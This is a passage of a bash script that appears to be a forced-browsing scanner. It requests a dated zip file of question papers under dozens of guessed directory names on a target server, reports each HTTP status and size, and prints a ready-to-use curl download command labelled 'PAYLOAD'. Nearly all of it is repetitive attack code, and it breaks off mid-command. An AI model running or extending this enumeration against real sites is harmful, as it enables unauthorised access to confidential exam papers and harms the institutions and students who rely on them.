payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaperDataProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ExamPaper_Management/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ExamPaper_Management/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ExamPaper_Management/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBFile-Panel/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBFile-Panel/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBFile-Panel/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Ops-QPControl/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Ops-QPControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Ops-QPControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Mgmt_QstnPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Mgmt_QstnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Mgmt_QstnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBatch-BulkUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBatch-BulkUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBatch-BulkUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [BatchUpload_QPAdmin/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}BatchUpload_QPAdmin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}BatchUpload_QPAdmin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Control_QPBulk/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Control_QPBulk/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Control_QPBulk/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Upload-QPManager/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Upload-QPManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Upload-QPManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [TestPaperTool/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}TestPaperTool/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}TestPaperTool/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ProcessingSuiteQPService/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ProcessingSuiteQPService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ProcessingSuiteQPService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBulk_Transfer/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBulk_Transfer/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBulk_Transfer/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [SyncQPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}SyncQPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}SyncQPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Suite_QuestionPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Suite_QuestionPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Suite_QuestionPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPManager-Module/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPManager-Module/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPManager-Module/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ControlQPDatabase/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ControlQPDatabase/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ControlQPDatabase/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ExamPaper-Tool/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ExamPaper-Tool/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ExamPaper-Tool/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaperDoc-Automation/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaperDoc-Automation/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaperDoc-Automation/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Service_QPaperDoc/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Service_QPaperDoc/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Service_QPaperDoc/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPHandler_Panel/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPHandler_Panel/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPHandler_Panel/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DatabaseManagerQPSystem/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DatabaseManagerQPSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DatabaseManagerQPSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBData-Management/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBData-Management/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBData-Management/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Q_P_Tool/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Q_P_Tool/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Q_P_Tool/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPServiceHandler/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPServiceHandler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPServiceHandler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaperDoc_Tool/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaperDoc_Tool/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaperDoc_Tool/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Dashboard-QPaperDoc/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Dashboard-QPaperDoc/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Dashboard-QPaperDoc/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [UploadService-QPAdmin/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}UploadService-QPAdmin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}UploadService-QPAdmin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [BulkUpload-QstnPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}BulkUpload-QstnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}BulkUpload-QstnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPControl_Handling/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPControl_Handling/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPControl_Handling/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataUpload-QPFile/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataUpload-QPFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataUpload-QPFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AutoUpload_QPBulk/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AutoUpload_QPBulk/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AutoUpload_QPBulk/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataSyncTestPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataSyncTestPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataSyncTestPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMgmt_Service/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMgmt_Service/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMgmt_Service/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPSystemModule/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPSystemModule/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPSystemModule/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [BatchUpload_QPB/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}BatchUpload_QPB/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}BatchUpload_QPB/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [MonitoringToolExamPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}MonitoringToolExamPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}MonitoringToolExamPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataSync_QstnPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataSync_QstnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataSync_QstnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPB-AccessControl/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPB-AccessControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPB-AccessControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPManagerProcessing/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPManagerProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPManagerProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPWorkflowCloudSync/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
